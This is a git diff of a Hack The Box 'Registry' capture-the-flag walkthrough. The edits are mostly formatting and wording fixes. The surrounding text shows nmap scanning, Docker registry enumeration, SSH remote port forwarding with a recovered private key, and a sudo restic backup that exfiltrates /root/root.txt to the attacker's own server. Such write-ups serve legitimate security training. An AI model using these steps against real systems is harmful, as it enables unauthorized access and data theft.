@@ -45,6 +45,7 @@ Similar to this, you could also run something like this:
 
 ```nmap -p- --min-rate=1000 -T4 <hostname>```
 
+
 2) nmap: I think most people in the information technology and security space know what nmap does. It is a very versatile Port scanning tool which also allows you to use scripts to further target the services found. Just like anything, it can be a useful tool while it can also be damaging if the user is not careful.
 
 What I typically start with when using nmap is:
@@ -58,6 +59,7 @@ What I typically start with when using nmap is:
 
 -vvvv: for extended verbosity (as I like as many details as I can get)
 ```
+
 
 ### MASSCAN
 
@@ -260,7 +262,7 @@ When trying it on the browser it prompts for authentication which seems to be us
 
 Looks like we need to do some research on Docker APIs and there is also a good document available on how to hack on Docker APIs and interact with them (see the resources provided).
 
-After interacting with *Docker API* a little, we find the repositories, tags, and list of blobs which are important. For this, instead of using the browser, I used curl to see what was available but in a textual format and to possibly determine what I can do with it (*scripting?!*)
+After interacting with the *Docker API* a little, we find the repositories, tags, and list of blobs which are important. For this, instead of using the browser, I used curl to see what was available but in a textual format and to possibly determine what I can do with it (*scripting?!*)
 
 
 ### CURL
@@ -912,7 +914,15 @@ At this point, we could also attempt to do SSH Remote Port Forwarding to bind a 
 
 **SYNTAX:**
 
-```ssh -R RemotePort:localhost:RestPort -i bolt_id_rsa bolt@registry.htb```
+```ssh -R <RemotePort>:localhost:<LocalPort> -i <Private_Key> <username>@<remoteHost>
+
+Where:
+RemotePort: is the new port you have Registry listen to which will forward data to the localhost:LocalPort.
+LocalPort: is the local service (Restic Server) in your host you want SSH on the remote host to forward traffic to.
+Private_Key: is the id_rsa file we found from the Docker Blobs.
+username: is the bolt user from registry.htb.
+remoteHost: is registry.htb.
+```
 
 
 Let's move forward and try this:
@@ -968,7 +978,7 @@ tcp        0      0 127.0.0.1:61234         0.0.0.0:*               LISTEN      
 
 As TCP 61234 is now being used by registry.htb and rest-server is running on TCP 8000 on my localhost, let's try and run restic from registry.htb.
 
-We need to run the restic command as weas www-data using *http://127.0.0.1:61234/* and try to exfiltrate the *root.txt* file using the port opened previously through SSH Remote Port Forwarding (used in the Restic Server URL).
+We need to run the restic command as www-data using *http://127.0.0.1:61234/* and try to exfiltrate the *root.txt* file using the port opened previously through SSH Remote Port Forwarding (used in the Restic Server URL).
 
 ```
 www-data@bolt:~/html/bolt/theme$ sudo /usr/bin/restic backup -r rest:http://127.0.0.1:61234/ /root/root.txt
